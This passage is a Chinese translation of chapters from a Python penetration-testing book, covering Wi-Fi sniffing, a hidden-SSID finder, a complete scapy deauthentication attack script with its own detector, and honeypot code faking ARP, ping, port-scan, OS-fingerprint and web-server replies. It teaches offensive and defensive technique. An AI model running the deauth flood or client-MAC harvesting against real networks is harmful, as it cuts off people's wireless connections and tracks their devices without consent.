在前面的类代码中，`DSset`提供了有关信道号的信息，因此`DSset`号是`3`。

让我们不要把它搞得太复杂，让我们简单地使用 scapy 捕获一个数据包：

```py
  >>> conf.iface="mon0"
  >>> frames = sniff(count=7)
  >>> frames
  <Sniffed: TCP:0 UDP:0 ICMP:0 Other:7>
  >>> frames.summary()
  RadioTap / 802.11 Management 8L 84:1b:5e:50:c8:6e > ff:ff:ff:ff:ff:ff   
 / Dot11Beacon / SSID='CITY PG3' / Dot11Elt / Dot11Elt / Dot11Elt /   
  Dot11Elt / Dot11Elt / Dot11Elt / Dot11Elt / Dot11Elt / Dot11Elt / 
  Dot11Elt / Dot11Elt / Dot11Elt / Dot11Elt / Dot11Elt / Dot11Elt / 
  Dot11Elt / Dot11Elt / Dot11Elt
  RadioTap / 802.11 Data 8L 84:1b:5e:50:c8:6e > 88:53:2e:0a:75:3f / 
  Dot11QoS / Dot11WEP
  84:1b:5e:50:c8:6e > 88:53:2e:0a:75:3f (0x5f4) / Raw
  RadioTap / 802.11 Control 13L None > 84:1b:5e:50:c8:6e / Raw
  RadioTap / 802.11 Control 11L 64:09:80:cb:3b:f9 > 84:1b:5e:50:c8:6e / 
  Raw RadioTap / 802.11 Control 12L None > 64:09:80:cb:3b:f9 / Raw
  RadioTap / 802.11 Control 9L None > 64:09:80:cb:3b:f9 / Raw
```

在以下截图中，你可以看到`0th`帧中有很多`Dot11Elt`。让我们详细检查`0th`帧：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/2bdc7183-5495-4275-923a-eec0ff9196f1.png)

帧中的 Dot11Elt

现在，你可以看到有几个`<Dot11Elt`。每个`Dot11Elt`有三个字段。`ord(fm[Dot11Elt:3].info)`给出了信道号，它位于第四个位置（根据类代码），即`<Dot11Elt ID=DSset len=1 info='x04'`。我希望你现在理解了`Dot11Elt`。

在 Wireshark 中，我们可以看到以下截图中由`Dot11Elt`表示的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/1be321c5-a233-46b0-8e5f-4ff1697d4338.png)

Wireshark 中的 Dot11Elt 表示

在前面的截图中，标记的参数由`Dot11Elt`表示。

`scapt_ssid.py`程序的输出如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/2ef3d028-6c82-40ea-bf27-824b5dcadca4.png)

输出与信道

# 检测 AP 的客户端

你可能想要获取特定 AP 的所有客户端。在这种情况下，你必须捕获探测请求帧。在 scapy 中，这称为`Dot11ProbeReq`。

让我们在以下截图中检查 Wireshark 中的帧：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/d15778b2-85ee-46e3-a409-31e416595b92.png)

探测请求帧

探测请求帧包含一些有趣的信息，比如源地址和 SSID，如前面的截图所示。

现在，是时候看看以下代码了：

```py
from scapy.all import *
interface ='mon0'
probe_req = []
ap_name = raw_input("Please enter the AP name ")
def probesniff(fm):
  if fm.haslayer(Dot11ProbeReq):
    client_name = fm.info
    if client_name == ap_name :
      if fm.addr2 not in probe_req:
        print "New Probe Request: ", client_name 
        print "MAC ", fm.addr2
        probe_req.append(fm.addr2)
sniff(iface= interface,prn=probesniff)
```

让我们看看在前面的程序中添加的新内容。用户输入感兴趣的 AP 的 SSID，将存储在`ap_name`变量中。`if fm.haslayer(Dot11ProbeReq):`语句表示我们对探测请求帧感兴趣。`if client_name == ap_name:`语句是一个过滤器，捕获所有包含感兴趣 SSID 的请求。`print "MAC ", fm.addr2`行打印连接到 AP 的无线设备的 MAC 地址。

`probe_req.py`程序的输出如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/e0c46329-8b26-4755-8168-ec337c65c4f4.png)

一系列无线设备连接到`CITY PG3`。

# 无线隐藏 SSID 扫描仪

有时，出于安全原因，用户隐藏他们的接入点 SSID，并配置他们的计算机以检测接入点。当您隐藏 SSID 接入点时，Beacon 帧将停止广播它们的 SSID。在这种情况下，我们必须捕获由 AP 的关联客户端发送的所有探测请求、探测响应、重新关联请求、关联响应和关联请求帧。为了我们的实验目的，我隐藏了 SSID，然后运行`ssid_finder_raw.py`代码如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/63ad8c2f-461b-4282-b1ff-5f17ab812e32.jpg)

在前面的截图中，您可以清楚地看到第一个 AP 的 SSID 没有显示。

运行`hidden_ssid_finder.py`程序，但在运行程序之前，请确保监视器模式已打开，我们正在使用监视器模式`mon0`：

1.  导入必要的模块：

```py
      import socket 
      import sys
```

1.  创建一个原始套接字，并将其绑定到`mon0`接口：

```py
      sniff = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 3)
```

1.  要求用户输入 AP 的 MAC 地址，并从 MAC 地址中删除冒号：

```py
      mac_ap = raw_input("Enter the MAC ")
      if ":"in mac_ap:
        mac_ap = mac_ap.replace(":","")
```

1.  创建列表和字典：

```py
      processed_client =[]
      filter_dict = {64:'Probe request', 80:'Probe       response',32:'Reassociation request',16:'Association response',       0:'Association request' }
      filter_type = filter_dict.keys()
      probe_request_length = 4+6+6+6+2
```

1.  连续接收`filter_type`字典中定义的帧：

```py
      while True :
        try:
          fm1 = sniff.recvfrom(6000)
          fm= fm1[0]
          radio_tap_lenght = ord(fm[2])
          if ord(fm[radio_tap_lenght]) in filter_type:
      dest =fm[radio_tap_lenght+4:radio_tap_lenght+4+6].encode('hex')
            source = fm[radio_tap_lenght+4+6       :radio_tap_lenght+4+6+6].encode('hex')
            bssid = fm[radio_tap_lenght+4+6+6       :radio_tap_lenght+4+6+6+6].encode('hex')
```

1.  查找 AP 的关联客户端：

```py
      if mac_ap == source and dest not in processed_client :
        processed_client.append(dest)
```

1.  查找关联客户端的探测请求帧，并从探测请求帧中提取 SSID：

```py
      if processed_client:
        if ord(fm[radio_tap_lenght]) == 64:
          if source in processed_client:
            ssid_bit = probe_request_length+radio_tap_lenght+1
            lenght_of_ssid= ord(fm[ssid_bit])
            if lenght_of_ssid:
              print "SSID is ",       fm[ssid_bit+1:ssid_bit+1+lenght_of_ssid]
```

1.  优雅地退出，请按*Ctrl* + *C*：

```py
  except KeyboardInterrupt:
    sniff.close()
    print "Bye"
    sys.exit()

  except Exception as e :
    print e
```

让我们运行代码。客户端必须连接到 AP 才能使代码逻辑正常工作：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/6556d0d3-090c-4ad6-9279-dff10521b741.jpg)

前面的输出显示只有一个客户端连接到 AP。

# 无线攻击

到目前为止，您已经看到了各种嗅探技术，以收集信息。在本节中，您将看到无线攻击是如何发生的，这是渗透测试中非常重要的主题。

# 去认证（deauth）攻击

去认证帧属于管理帧的一种。当客户端希望与 AP 断开连接时，客户端发送去认证帧。AP 也以回复的形式发送去认证帧。这是正常的过程，但攻击者利用这个过程。攻击者伪造受害者的 MAC 地址，并代表受害者向 AP 发送去认证帧；因此，与客户端的连接被断开。`aireplay-ng`程序是执行去认证攻击的最佳工具。在本节中，您将学习如何使用 Python 执行此攻击。但是，您可以利用`ssid_finder_raw.py`代码的输出，因为`ssid_finder_raw.py`程序会写入一个文件。

现在，让我们看看以下代码：

+   导入必要的模块和库：

```py
      from scapy.all import *
      import shelve 
      import sys
      import os
      from threading import Thread
```

+   以下代码打开`wireless_data.dat`文件，获取信息，并显示给用户：

```py
      def main():
         interface = "mon0"
         s = shelve.open("wireless_data.dat")
         print "Seq", "\tBSSID\t\t", "\tChannel", "SSID"
         keys= s.keys()
         list1 = []
         for each in keys:
            list1.append(int(each))
            list1.sort()
         for key in list1:
            key = str(key)
            print key,"\t",s[key][0],"\t",s[key][1],"\t",s[key][2]
         s.close()
```

+   以下代码要求用户输入 AP 序列号。如果用户想指定任何受害者，那么用户可以提供受害者机器的 MAC；否则，代码将选择广播地址：

```py
        a = raw_input("Enter the seq number of wifi ")
        r = shelve.open("wireless_data.dat")
        print "Are you Sure to attack on ", r[a][0]," ",r[a][2]
        victim_mac = raw_input("Enter the victim MAC or for broadcast 
        press 0 \t")
        if victim_mac=='0':
          victim_mac ="FF:FF:FF:FF:FF:FF"
```

+   所选 AP 正在使用的信道号；以下代码段为`mon0`设置相同的信道号：

```py
        cmd1 = "iwconfig wlan1 channel "+str(r[a][1])
        cmd2 = "iwconfig mon0 channel "+str(r[a][1])
        os.system(cmd1)
        os.system(cmd2)
```

+   这段代码非常容易理解。`frame= RadioTap()/ Dot11(addr1=victim_mac,addr2=BSSID, addr3=BSSID)/ Dot11Deauth()`语句创建去认证数据包。从本章的第一张截图中，您可以检查这些地址：

```py
  BSSID = r[a][0]
  frame= RadioTap()/ Dot11(addr1=BSSID,addr2=victim_mac, addr3=BSSID)/ 
  Dot11Deauth()
  frame1= RadioTap()/ Dot11(addr1=victim_mac,addr2=BSSID, addr3=BSSID)/ 
  Dot11Deauth()
```

+   以下代码告诉线程攻击去攻击 deauth 攻击：

```py
  if victim_mac!="FF:FF:FF:FF:FF:FF":
    t1 = Thread(target=for_ap, args=(frame,interface))
    t1.start()
  t2 = Thread(target=for_client, args=(frame1,interface))
  t2.start()
```

在最后一行，`sendp(frame,iface=interface, count= 1000, inter= .1)`，`count`给出发送的数据包总数，`inter`表示两个数据包之间的间隔：

```py
def for_ap(frame,interface):
  while True:
    sendp(frame, iface=interface, count=20, inter=.001)

def for_client(frame,interface):
  while True:
    sendp(frame, iface=interface, count=20, inter=.001)

if __name__ == '__main__':
  main()
```

`deauth.py`程序的输出如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/691a0ae7-cfca-4635-b748-94d0223e6e3d.jpg)

这种攻击的目的不仅是执行去认证攻击，还要检查受害者的安全系统。IDS 应该有能力检测去认证攻击。到目前为止，还没有避免攻击的方法，但可以检测到攻击。

# 检测 deauth 攻击

在本节中，我们将讨论如何检测去认证攻击。这类似于一个无线 IDS，它检测去认证攻击。在这个程序中，我们将找出哪些接入点收到去认证帧以及数量。我们将在这里使用原始套接字来检测攻击。

让我们讨论`deauth_ids.py`程序。确保监视器打开；否则，程序会报错：

+   导入必要的模块和库：

```py
      import socket 
      import Queue
      from threading import Thread
      from collections import Counter
```

+   队列和计数器将在以后使用：

```py
      q1 = Queue.Queue()
      co = Counter()
```

+   以下代码创建并绑定原始套接字到`mon0`：

```py
      try:
        sniff = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 3)
        sniff.bind(("mon0", 0x0003))
      except Exception as e :
        print e 
```

+   以下函数 IDs 接收去认证帧，提取 BSSID，并将其放入全局队列中：

```py
      def ids():
        global q1
        while True :
          fm1 = sniff.recvfrom(6000)
          fm= fm1[0]
          radio_tap_lenght = ord(fm[2])
          if ord(fm[radio_tap_lenght]) == 192:
      bssid1 = fm[radio_tap_lenght+4+6+6 :radio_tap_lenght+4+6+6+6]
      bssid = ':'.join('%02x' % ord(b) for b in bssid1)
      q1.put(bssid)
```

+   以下的`insert_frame`函数从全局队列中获取 deauth 帧并制作一个计数器来显示它：

```py
      def insert_frame():
        global q1
        while True:
          mac=q1.get()
          list1 = [mac]
          co.update(list1)
          print dict(co)
```

+   以下代码创建了两个线程，启动了`ids()`和`insert_frame`函数：

```py
      i = Thread(target=ids)
      f = Thread(target=insert_frame)
      i.start()
      f.start()
```

为了执行攻击和检测，我们需要两台安装了 Linux 的机器和一个无线接入点。一台机器将进行攻击，第二台将运行我们的`deauth_ids.py`检测程序。

让我们讨论代码的输出。为了测试目的，运行`deauth_ids.py`，并从第二台机器开始 deauth 攻击：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/60a44e84-dbbd-4df6-9c9f-424dd39a4237.jpg)

你可以看到它不断地显示受害者 BSSID，并且它的计数器显示接收到的帧数。让我们在下文中看另一个截图：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/5653fa54-b845-41b6-8513-d1b2d4302397.jpg)

正如你所看到的，如果攻击者改变目标，我们的程序可以检测到多个接入点上的攻击。

# 总结

在本章中，我们学习了关于无线帧以及如何使用 Python 脚本和 scapy 库从无线帧中获取 SSID、BSSID 和信道号等信息。我们还学习了如何将无线设备连接到 AP。在信息收集之后，我们转向了无线攻击。我们讨论的第一种攻击是 deauth 攻击，类似于 Wi-Fi 干扰器。在这种攻击中，你必须攻击无线设备并观察 AP 或入侵检测系统的反应。

在第六章中，*蜜罐-为攻击者设置陷阱*，您将学习如何为黑客设置陷阱，如何创建虚假回复或虚假身份。


# 第六章：蜜罐-为攻击者建立陷阱

在第五章中，*无线渗透*，您看到了各种网络攻击以及如何防范。在本章中，您将看到一些积极的方法。在[第二章](https://cdp.packtpub.com/python_penetration_testing_essentials__second_edition/wp-admin/post.php?post=52&action=edit)，*扫描渗透*，您学习了使用 ping 扫描进行 IP 扫描以及使用 TCP 连接扫描进行端口扫描。但是当 ping 扫描和端口扫描代码给出虚假目标时会发生什么？您会尝试利用虚假目标。设置为诱使攻击者的诱饵机器记录攻击者的动作。在看到所有的技巧和攻击之后，管理员可以制定新的网络加固策略。在本章中，我们将使用 Python 代码来完成任务。

在本章中，我们将学习以下主题：

+   伪 ARP 回复

+   伪 ping 回复

+   伪端口扫描回复

+   对 nmap 的伪 OS 签名回复

+   伪 Web 服务器回复

ARP 协议属于 TCP/IP 第 1 层，网络访问层。

# 技术要求

用户需要在系统上安装 Python 2.7.x。最后，要使用本书的 Git 存储库，用户需要安装 Git。

本章的代码文件可以在 GitHub 上找到：

[`github.com/PacktPublishing/Python-Penetration-Testing-Essentials-Second-Edition/tree/master/Chapter06`](https://github.com/PacktPublishing/Python-Penetration-Testing-Essentials-Second-Edition/tree/master/Chapter06)

查看以下视频，以查看代码的运行情况：

[`goo.gl/jbgbBU`](https://goo.gl/jbgbBU)

# 伪 ARP 回复

在本节中，我们将学习如何发送伪 ARP 回复。伪 ARP 回复程序是为了伪 ping 回复而制作的，因为当攻击者向特定 IP 发送 ping 请求时，攻击者机器首先发送 ARP 请求以获取 MAC 地址。

当攻击者在蜜罐的子网上或子网外时，蜜罐将发送伪回复。让我们看看拓扑图：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/8cf458f9-5822-4a0e-8c19-08ddcc9fbbfb.jpg)

我使用了三台机器：运行蜜罐代码的 Debian，作为网关的 RHEL，以及作为攻击者机器的 Kali Linux。

让我们看看伪回复代码。代码名称是`arp_reply.py`：

+   代码将使用以下模块：

```py
      import socket
      import struct
      import binascii
      import Queue
      import threading
      import sys
```

+   在以下代码中，创建了两个套接字。一个用于接收器，一个用于发送回复数据包。创建了一个全局队列`Q`，如下所示：

```py
      mysocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, 
      socket.ntohs(0x0806))
      mysocket_s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, 
      socket.ntohs(0x0806))
      mysocket_s.bind(('eth0',socket.htons(0x0806)))

      Q = Queue.Queue()
```

+   以下函数接收传入的帧。`arp_l = struct.unpack("!2s2sss2s6s4s6s4s",arp_h)`代码解包 ARP 数据包，`if arp_l[4] == '\x00\x01':`语法只广播 ARP 数据包。`Q.put([eth,arp_l])`语法将数据包放入全局队列`Q`中，如下所示：

```py
      def arp_receiver():
        while True:
          pkt = mysocket.recvfrom(1024)
          ethhead = pkt[0][0:14]
          eth = struct.unpack("!6s6s2s",ethhead)
          binascii.hexlify(eth[2])
          arp_h = pkt[0][14:42]
          arp_l = struct.unpack("!2s2sss2s6s4s6s4s",arp_h)
          if arp_l[4] == '\x00\x01':
            Q.put([eth,arp_l])
```

+   以下函数从全局队列获取 ARP 数据包。该函数从用户提供的命令行参数中获取 MAC（当前机器 MAC）。在形成以太网和 ARP 数据包之后，`mysocket_s.send(target_packet)`语法发送数据包，如下所示：

```py
         def arp_sender():
            while True:
             main_list = Q.get()
             eth_header = main_list[0]
             arp_packet = main_list[1]
             mac_sender = sys.argv[1].decode('hex')
             eth1 = eth_header[1]+mac_sender+eth_header[-1]
             arp1 = "".join(arp_packet[0:4])
             arp1 = arp1+'\x00\x02'+mac_sender+   
             arp_packet[-1]+arp_packet[5]+arp_packet[6]
             target_packet = eth1+arp1
             mysocket_s.send(target_packet)
```

+   以下代码创建了两个线程，以并行方式运行接收器和发送器函数：

```py
      r = threading.Thread(target=arp_receiver)
      s = threading.Thread(target=arp_sender)
      r.start()
      s.start()
```

在运行代码之前，使用以下命令：

```py
iptables -A OUTPUT -o eth0 -j DROP
```

前面的命令禁用了内置的 TCP/IP 回复，因为现在我们的程序将发送回复。

让我们在 Debian 机器上使用以下命令来运行代码：

```py
python arp_reply.py <mac of machine>
```

在我的机器上，我已经给出如下：

```py
python arp_reply.py 000c29436fc7
```

现在`arp_reply`代码正在运行。现在我们必须运行会给出伪 ping 回复的伪代码。

# 伪 ping 回复

在本节中，您将学习如何发送伪 ping 回复数据包。在伪 ping 回复代码中，我没有使用任何库。

让我们理解代码。代码名称是`icmp_reply.py`。为了运行代码，您需要从[`pypi.python.org/pypi/ping/0.2`](https://pypi.python.org/pypi/ping/0.2)安装`ping`模块：

+   代码中使用了以下模块：

```py
      import socket
      import struct
      import binascii
      import ping
      import Queue
      import threading
      import sys
      import random
      import my_logger
```

+   以下代码定义了一个队列`Q`和两个套接字。一个套接字将用于接收数据包，另一个将用于发送数据包：

```py
      Q = Queue.Queue()
      IP_address = 0
      my_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, 
      socket.ntohs(0x0800))
      my_socket_s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, 
      socket.ntohs(0x0800))
      my_socket_s.bind(('eth0',socket.htons(0x0800)))
```

+   以下代码将用于计算 ICMP 回复数据包的校验和。代码非常复杂：

```py
      def calculate_checksum(source_string):
        countTo = (int(len(source_string) / 2)) * 2
        sum = 0
        count = 0
        # Handle bytes in pairs (decoding as short ints)
        loByte = 0
        hiByte = 0
        while count < countTo:
          if (sys.byteorder == "little"):
            loByte = source_string[count]
            hiByte = source_string[count + 1]
          else:
            loByte = source_string[count + 1]
            hiByte = source_string[count]
          sum = sum + (ord(hiByte) * 256 + ord(loByte))
          count += 2

        # Handle last byte if applicable (odd-number of bytes)
        # Endianness should be irrelevant in this case
        if countTo < len(source_string): # Check for odd length
          loByte = source_string[len(source_string) - 1]
          sum += ord(loByte)

        sum &= 0xffffffff # Truncate sum to 32 bits (a variance from 
        ping.c, which # uses signed ints, but overflow is unlikely in 
        ping)
   sum = (sum >> 16) + (sum & 0xffff) # Add high 16 bits to low 16 bits
   sum += (sum >> 16) # Add carry from above (if any)
   answer = ~sum & 0xffff # Invert and truncate to 16 bits
   answer = socket.htons(answer)

   return answer
```

+   以下函数用于计算 IPv4 数据包的校验和：

```py
      def ip_checksum(ip_header, size):
        cksum = 0
        pointer = 0
        while size > 1:
          cksum += int((ip_header[pointer] + ip_header[pointer+1]),16)
          size -= 2
          pointer += 2
        if size: #This accounts for a situation where the header is odd
          cksum += ip_header[pointer]

        cksum = (cksum >> 16) + (cksum & 0xffff)
        cksum += (cksum >>16)

        check_sum1= (~cksum) & 0xFFFF
        check_sum1 = "%x" % (check_sum1,)
        return check_sum1
```

+   以下函数负责为 ICMP 回复数据包创建 IPv4 头：

```py
      def ipv4_creator(ipv4_header):
        try:
          global IP_address
          field1,ip_id,field2,ttl,protocol,checksum,ip1,ip2
          =struct.unpack("!4s2s2sss2s4s4s", ipv4_header)
          num = str(random.randint(1000,9999))
          ip_id = num.decode('hex')
          checksum = '\x00\x00'
          ipv4_new_header =   
          field1+ip_id+field2+'40'.decode('hex')+protocol+ip2+ip1
          raw_tuple =   
          struct.unpack("!ssssssssssssssssss",ipv4_new_header) 
          # for checksum
          header_list= [each.encode('hex') for each in raw_tuple]
          check_sum= str(ip_checksum(header_list, len(header_list)))
          ipv4_new_header =   
          field1+ip_id+field2+'40'.decode('hex')+protocol
          +check_sum.decode('hex')+ip2+ip1
          if IP_address != ip1:
          my_logger.logger.info(socket.inet_ntoa(ip1))

          IP_address = ip1
          return ipv4_new_header
        except Exception as e :
          my_logger.logger.error(e)
```

+   以下函数生成 ICMP 回复数据包。在`ipv4_creator`和`icmp_creator`函数中，我使用了不同的方法来添加字段。您可以使用任何您喜欢的方法。在`IPv4_creator`函数中，我使用`ipv4_new_header = field1+ip_id+field2+'40'.decode('hex')+protocol+check_sum.decode('hex')+ip2+ip1`来添加字段，在`icmp_creator`中，我使用`struct.pack`来形成数据包：

```py
      def icmp_creator(icmp_header,icmp_data):
      try:
       dest_addr=""
       ICMP_REPLY = 0
       seq_number = 0
       identifier =0
       header_size = 8
       packet_size = 64
       type1, code, checksum, packet_id, seq_number =  
       struct.unpack("!BBHHH", icmp_header)
       cal_checksum = 0
       header = struct.pack("!BBHHH", ICMP_REPLY, 0, cal_checksum, 
       packet_id ,seq_number )
       cal_checksum = calculate_checksum(header +icmp_data)
       header = struct.pack("!BBHHH", ICMP_REPLY, 0, cal_checksum, 
       packet_id, seq_number )
       packet = header + icmp_data
       return packet
        except Exception as e :
          my_logger.logger.error(e)
```

+   以下函数创建了以太网头：

```py
      def ethernet_creator(eth_header):
        eth1,eth2,field1 = struct.unpack("!6s6s2s",eth_header)
        eth_header = eth2+eth1+field1
        return eth_header
```

+   以下代码接收传入的请求数据包。为简单起见，我为 IPv4 头部取了 20 个字节：

```py
      def receiver_icmp():
        while True:
          try:
            received_packet, addr = my_socket.recvfrom(1024)
            protocol_type = received_packet[23] 
            icmp_type = received_packet[34]
            protocol_type=struct.unpack("!B",protocol_type)[0]
            icmp_type = struct.unpack("!B",icmp_type)[0]
            if protocol_type==1 and icmp_type==8:
              eth_header = received_packet[0:14]
              ipv4_header = received_packet[14:34]
              icmpHeader = received_packet[34:42]
              icmp_data = received_packet[42:]
        data_tuple1 = (eth_header, ipv4_header, icmpHeader,icmp_data)
        Q.put(data_tuple1)
             except Exception as e :
               my_logger.logger.error(e)

```

+   以下函数发送 ICMP 回复数据包：

```py
      def sender_icmp():
        while True:
          try:
            data_tuple1 = Q.get()
            icmp_packet = icmp_creator(data_tuple1[2],data_tuple1[3])
            ipv4_packet = ipv4_creator(data_tuple1[1])
            eth_packet = ethernet_creator(data_tuple1[0])
            frame = eth_packet+ipv4_packet+icmp_packet
            my_socket_s.send(frame)
          except Exception as e :
            my_logger.logger.error(e)
```

+   以下代码创建了两个线程，分别运行接收和发送函数：

```py
      r = threading.Thread(target=receiver_icmp)
      s = threading.Thread(target=sender_icmp)
      r.start()
      s.start()
```

现在编码部分已经完成，请运行`code icmp_reply.py`。请确保`arp_reply`正在运行。要测试代码，只需从 Kali Linux ping 不同的 IP，如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/b725f338-2b23-45ab-a67a-4de33a8af68e.jpg)

前面的输出显示代码运行正常。让我们使用第二章中的`ping_sweep_send_rec.py`代码进行测试，*扫描渗透测试*。请参阅以下屏幕截图：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/f7077bea-933b-4cb2-826f-ed4f224546dd.jpg)

我们正在为 100 个 IP 获得虚假回复。我们的下一个目标是给传输层提供虚假回复。

# 虚假端口扫描回复

在本节中，我们将看看如何在 TCP 层给出虚假回复。程序将对打开的端口给出虚假回复。对于这段代码，我们将使用 scapy 库，因为 TCP 头部非常复杂。程序名称是`tcp_trap.py`：

+   使用以下库和模块：

```py
      import socket
      import struct
      import binascii
      import Queue
      from scapy.all import *
      import threading
```

+   已创建原始套接字以接收传入数据包，如下所示：

```py
      my_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, 8)
      Q = Queue.Queue()
```

+   以下函数接收传入的 TCP/IP 数据包。很多行已经在第三章，*嗅探和渗透测试*中讨论过。`if（D_port==445`或`D_port==135`或`D_port==80`）：语法表明我们只对端口`445`、`135`和`80`感兴趣：

```py
      def receiver():
        while True:
        try:
         pkt = my_socket.recvfrom(2048)
         num=pkt[0][14].encode('hex')
         ip_length = (int(num)%10)*4
         ip_last_range = 14+ip_length
         ipheader = pkt[0][14:ip_last_range]
         ip_hdr = struct.unpack("!8sBB2s4s4s",ipheader)
         S_ip =socket.inet_ntoa(ip_hdr[4])
         D_ip =socket.inet_ntoa(ip_hdr[5])
         tcpheader = pkt[0][ip_last_range:ip_last_range+20]
         tcp_hdr = struct.unpack("!HHL4sBB6s",tcpheader)
         S_port = tcp_hdr[0]
         D_port = tcp_hdr[1]
         SQN = tcp_hdr[2]
         flags = tcp_hdr[5]
            if (D_port==445 or D_port==135 or D_port==80):
              tuple1 = (S_ip,D_ip,S_port,D_port,SQN,flags)
              Q.put(tuple1)

          except Exception as e:
            print e
```

+   以下函数发送 TCP SYN，ACK 标志启用的响应，端口为`445`和`135`，端口`80`发送 RST，ACK 标志：

```py
      def sender(): 
      while True:
        d_ip,s_ip,d_port,s_port,SQN,flag = Q.get()

        if (s_port==445 or s_port==135) and (flag==2):
        SQN= SQN+1
        print flag,"*"*100
        packet  
        =IP(dst=d_ip,src=s_ip)/TCP(dport=d_port,sport=s_port,
        ack=SQN,flags="SA",window=64240, 
            options=[('MSS',1460),("WScale",3)])
            #packet 
        =IP(dst=d_ip,src=s_ip)/TCP(dport=d_port,sport=s_port,
        ack=SQN,flags="SA")
          else :
            SQN= SQN+1
            packet 
        =IP(dst=d_ip,src=s_ip)/TCP(dport=d_port,sport=s_port,
        ack=SQN,seq=SQN,flags="RA",window=0) 
          send(packet) 
```

+   以下代码指示了线程的创建，一个用于处理接收函数，另外三个用于处理发送函数：

```py
      r = threading.Thread(target=receiver)
      r.start()

      for each in xrange(3):
        s = threading.Thread(target=sender)
        s.start()
```

由于 scapy，库代码变得非常简短。现在运行`tcp_trap.py`代码。确保`arp_reply.py`和`icmp_reply.py`代码也在运行。

从攻击者那里，机器运行`nmap`；请参阅以下屏幕截图：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/705a9bfd-da56-4d7d-ac71-fcc9c8b8b5cb.png)

在前面的输出中，我们使用了`nmap`和`portscanner_15.py`（[第二章](https://cdp.packtpub.com/python_penetration_testing_essentials__second_edition/wp-admin/post.php?post=52&action=edit)，*扫描渗透测试*）。`nmap`和 Python 代码都使用了三次握手过程。输出显示端口`135`和`445`是打开的。

# nmap 的虚假 OS 签名回复

在本节中，我们将创建一个虚假的 OS 签名。通过使用以下`nmap`，我们可以识别受害者机器的操作系统：

`nmap -O <ip-address>`：`nmap`发送七个 TCP/IP 精心制作的数据包，并使用自己的 OS 签名数据库评估响应。有关更多详细信息，您可以阅读[`nmap.org/misc/defeat-nmap-osdetect.html`](https://nmap.org/misc/defeat-nmap-osdetect.html)网页。

`nmap`需要至少一个开放和一个关闭的端口来识别操作系统。同样，我们将使用之前的所有代码。端口`445`和`135`作为开放端口，`80`作为关闭端口。

让我们运行`nmap`，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/5dbde29f-8ac4-45ca-905a-89e97e228e46.jpg)

它给出了不同的操作系统，而不是 Debian。通过学习`nmap`操作系统检测算法，您可以使代码变得更加复杂。

# 虚假的 Web 服务器回复

在本节中，您将学习如何创建一个虚假的 Web 服务器签名。这是应用层代码。本节的代码与之前的代码无关。为了获取服务器签名或横幅抓取，我将使用 ID Servetool。

让我们看看`fake_webserver.py`代码：

+   在程序中使用以下模块。`logger1`模块用于创建日志文件。稍后您将看到`logger1`的代码：

```py
   from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
   import logger1
```

+   仔细看以下代码片段。`fakewebserver`类继承自`BaseHTTPRequestHandler`类。`send_response`方法覆盖了`BaseHTTPRequestHandler`类的方法，因为我们将我们的自定义消息发送为`self.send_header('Server', "mohit``raj")`。`log_date_time_string`和`send_header`方法以及`client_address`实例变量都是从`BaseHTTPRequestHandler`类继承的。在这里，我将`mohit raj`服务器名称发送为：

```py
      class fakewebserver(BaseHTTPRequestHandler):

      def send_response(self, code, message=None): #overriding

        self.log_request(code)
        if message is None:
            if code in self.responses:
                message = self.responses[code][0]
            else:
                message = ''
        if self.request_version != 'HTTP/0.9':
            self.wfile.write("%s %d %s\r\n" %
                             (self.protocol_version, code, message))

        self.send_header('Server', "mohit raj")
        self.send_header('Tip',"Stay away")
        self.send_header('Date', self.date_time_string())
        str1 = self.client_address[0]+" -- 
        "+self.log_date_time_string()
        logger1.logger.info(str1)
```

+   以下方法发送标头和响应代码：

```py
    def _set_headers(self):
        self.send_response(200)
        self.end_headers()
```

+   当收到`GET`请求时，将调用以下方法：

```py
    def do_GET(self):
        self._set_headers()
        self.wfile.write("<html><body><h1>hi!</h1></body></html>")
```

+   当收到`HEAD`请求时，将调用以下方法：

```py
    def do_HEAD(self):
        self._set_headers()
```

+   以下用于传入的`POST`请求：

```py
    def do_POST(self):
        self._set_headers()
        self.wfile.write("<html><body><h1>POST!</h1></body></html>")
```

+   以下函数用于启动服务器。将使用端口`80`。`serve_forever`方法处理请求，直到收到显式的`shutdown()`请求。该方法是从`SocketServer.BaseServer`类继承的：

```py
      def start(port=80):
          server_address = ('', port)
          httpd = HTTPServer(server_address, fakewebserver)
          print 'Starting Server...'
          httpd.serve_forever()
```

在另一台机器上运行代码。我正在使用 Windows 10 来运行代码。从第二台计算机上，使用工具 ID 服务器来查找服务器签名。我得到了以下输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/9eb7b79d-f007-4e3d-be5c-192f8fd2a3f3.jpg)

从输出中，我们可以说我们的代码运行正常。因此，您可以编写自己的消息。

让我们看看`logger1`的代码：

```py
import logging
